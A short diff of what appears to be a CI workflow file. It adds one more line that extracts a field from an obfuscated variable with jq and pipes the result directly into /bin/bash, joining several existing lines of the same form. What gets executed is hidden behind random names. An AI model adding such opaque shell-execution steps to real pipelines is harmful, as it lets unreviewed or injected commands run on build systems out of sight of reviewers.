@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$omu26" | jq -r .ocs63490 | /bin/bash
           printf '%s' "$sul17462" | jq -r .apy6 | /bin/bash
           printf '%s' "$l82" | jq -r .dtade02933 | /bin/bash
+          printf '%s' "$anyua3133" | jq -r .xgwto9359 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
